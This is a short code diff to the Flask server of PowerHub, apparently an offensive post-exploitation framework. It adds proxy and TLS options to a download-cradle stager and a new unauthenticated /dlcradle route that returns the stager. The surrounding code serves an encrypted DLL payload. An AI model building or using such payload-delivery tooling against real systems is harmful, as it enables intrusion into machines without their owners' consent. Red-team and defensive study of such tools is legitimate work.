@@ -9,6 +9,7 @@ from powerhub.tools import encrypt, compress, key
 from powerhub.auth import requires_auth
 from powerhub.repos import repositories, install_repo
 from powerhub.obfuscation import symbol_name
+from powerhub.args import args
 
 from datetime import datetime
 from base64 import b64decode, b64encode
@@ -17,6 +18,9 @@ import os
 
 app = Flask(__name__)
 app.secret_key = os.urandom(16)
+
+need_proxy = True
+need_tlsv12 = (args.SSL_KEY is not None)
 
 
 @app.route('/')
@@ -29,9 +33,10 @@ def index():
 @requires_auth
 def hub():
     context = {
-        "dl_str": stager_str,
+        "dl_str": stager_str(need_proxy, need_tlsv12),
         "modules": modules,
         "repositories": list(repositories.keys()),
+        "SSL": args.SSL_KEY is not None,
     }
     return render_template("hub.html", **context)
 
@@ -165,6 +170,14 @@ def payload_l():
         DLL = f.read()
     DLL = b64encode(encrypt(b64encode(DLL), key))
     return Response(DLL, content_type='text/plain; charset=utf-8')
+
+
+@app.route('/dlcradle')
+def dlcradle():
+    global need_proxy, need_tlsv12
+    need_proxy = request.args['proxy'] == 'true'
+    need_tlsv12 = request.args['tlsv12'] == 'true'
+    return stager_str(need_proxy, need_tlsv12)
 
 
 @app.route('/u', methods=["POST"])
